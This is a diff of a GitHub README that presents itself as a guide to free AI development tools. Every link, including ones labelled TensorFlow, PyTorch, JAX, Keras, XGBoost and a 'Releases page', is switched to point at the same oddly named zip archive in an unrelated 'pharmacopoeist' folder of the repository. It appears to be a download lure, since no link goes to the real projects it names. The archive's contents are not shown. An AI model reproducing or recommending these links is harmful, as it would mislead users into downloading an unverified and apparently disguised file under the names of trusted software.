@@ -1,6 +1,6 @@
 # 🚀 ai-open-resources-guide - Discover Free AI Development Tools
 
-[![Download Now](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip)](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip)
+[![Download Now](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip)](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip)
 
 ## 📋 Overview
 
@@ -10,7 +10,7 @@ This repository offers a list of **100% free** tools, platforms, frameworks, and
 
 To start using this repository, you need to download the resources listed here. Follow these steps to get started:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip) to find the latest version.
 2. **Choose Your Resources**: Review the available resources. Each tool may have its specific instructions and links.
 3. **Download the Resources**: Click on the download links for the tools or frameworks you wish to use.
 
@@ -20,20 +20,20 @@ This repository includes various frameworks ideal for AI development. Here are a
 
 | Tool          | Description                             | Download Link                           |
 |---------------|-----------------------------------------|-----------------------------------------|
-| TensorFlow    | Google's framework for Deep Learning    | [TensorFlow](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip) |
-| PyTorch       | Popular framework for AI development     | [PyTorch](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip)           |
-| JAX           | Optimized framework by Google            | [JAX](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip)      |
-| Keras         | High-level API for deep learning         | [Keras](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip)               |
-| Scikit-Learn  | Classic ML algorithms                    | [Scikit-Learn](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip) |
-| XGBoost       | Gradient boosting framework               | [XGBoost](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip) |
-| LightGBM      | Fast and efficient boosting              | [LightGBM](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip) |
-| CatBoost      | Boosting for categorical features        | [CatBoost](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip)        |
+| TensorFlow    | Google's framework for Deep Learning    | [TensorFlow](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip) |
+| PyTorch       | Popular framework for AI development     | [PyTorch](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip)           |
+| JAX           | Optimized framework by Google            | [JAX](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip)      |
+| Keras         | High-level API for deep learning         | [Keras](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip)               |
+| Scikit-Learn  | Classic ML algorithms                    | [Scikit-Learn](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip) |
+| XGBoost       | Gradient boosting framework               | [XGBoost](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip) |
+| LightGBM      | Fast and efficient boosting              | [LightGBM](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip) |
+| CatBoost      | Boosting for categorical features        | [CatBoost](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip)        |
 
 ## 💾 Download & Install
 
 To download the resources:
 
-1. **Access the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip).
+1. **Access the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip).
 2. **Select the Resources**: Choose the frameworks or libraries that you want to explore.
 3. **After Download**: Follow the provided instructions on each tool's website for installation and setup.
 
@@ -77,4 +77,4 @@ You can explore additional resources through online searches, forums, and commun
 
 The **ai-open-resources-guide** offers a comprehensive collection of free tools for anyone interested in diving into AI development. By following the steps above, you can easily download and set up these resources.
 
-[![Download Now](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip)](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/ai-open-resources-guide-3.5.zip)
+[![Download Now](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip)](https://raw.githubusercontent.com/xlunaxmoonxstarsx/ai-open-resources-guide/main/pharmacopoeist/guide-ai-resources-open-Ochozoma.zip)
